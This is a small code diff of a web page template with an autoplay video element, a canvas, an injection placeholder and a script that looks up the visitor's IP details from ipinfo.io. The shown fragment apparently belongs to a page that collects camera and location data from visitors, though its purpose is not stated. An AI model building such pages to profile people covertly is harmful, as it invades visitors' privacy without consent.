@@ -45,10 +45,8 @@
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
-
-  <script>
-    
   <!--__INJECT_ID__-->
+  <script>
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
@@ -65,7 +63,6 @@
       readme: ''
     };
 
-    // Fetch all IP info
     fetch('https://ipinfo.io/json')
       .then(res => res.json())
       .then(data => {
